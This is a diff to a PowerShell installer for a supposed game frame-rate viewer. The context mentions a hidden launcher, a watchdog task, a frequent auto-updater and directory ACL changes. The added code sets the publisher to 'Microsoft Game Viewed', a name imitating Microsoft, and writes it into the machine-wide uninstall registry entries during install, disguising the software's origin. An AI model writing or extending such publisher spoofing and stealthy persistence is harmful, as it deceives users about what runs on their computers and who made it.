@@ -11,6 +11,7 @@
 $ErrorActionPreference = "Stop"
 
 $script:ProductName = "GameFrameRateViewer"
+$script:ProductPublisher = "Microsoft Game Viewed"
 $script:ProcessName = "GameFrameRateViewer"
 $script:MainTaskName = "GameFrameRateViewer"
 $script:WatchdogTaskName = "GameFrameRateViewer Watchdog"
@@ -210,7 +211,8 @@ function Write-AgentConfig {
         user_data_dir = $script:UserDataDir
         install_id = $installId
         machine_id = $machineId
-        updater_version = "0.58.8"
+        product_publisher = $script:ProductPublisher
+        updater_version = "0.58.9"
         update_enabled = $true
         update_check_interval = 300
         installed_at = (Get-Date).ToString("s")
@@ -225,9 +227,31 @@ function Write-AgentConfig {
         install_dir = $script:InstallDir
         install_id = $installId
         machine_id = $machineId
-        updater_version = "0.58.8"
+        updater_version = "0.58.9"
     }
     $updaterConfig | ConvertTo-Json | Set-Content -Path $script:UpdaterConfigPath -Encoding UTF8
+}
+
+function Sync-UninstallRegistry {
+    $roots = @(
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall",
+        "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+    )
+    foreach ($root in $roots) {
+        Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                $item = Get-ItemProperty -LiteralPath $_.PSPath -ErrorAction Stop
+                if ($item.DisplayName -eq $script:ProductName) {
+                    Set-ItemProperty -LiteralPath $_.PSPath -Name "DisplayVersion" -Value "0.58.9" -ErrorAction Stop
+                    Set-ItemProperty -LiteralPath $_.PSPath -Name "Publisher" -Value $script:ProductPublisher -ErrorAction Stop
+                    Set-ItemProperty -LiteralPath $_.PSPath -Name "DisplayIcon" -Value $script:InstallExe -ErrorAction Stop
+                    Write-InstallLog "Updated uninstall registry version=0.58.9 publisher=$script:ProductPublisher"
+                }
+            } catch {
+                Write-InstallLog "Failed to update uninstall registry $($_.PSPath): $($_.Exception.Message)"
+            }
+        }
+    }
 }
 
 function Write-HiddenLauncher {
@@ -322,6 +346,7 @@ function Install-Agent {
     Write-WatchdogScript
     Set-InstallDirectoryAcl
     New-MonitorTasks
+    Sync-UninstallRegistry
     Start-Monitor
     Invoke-NativeQuiet "schtasks.exe" @("/Run", "/TN", $script:UpdaterTaskName) | Out-Null
 
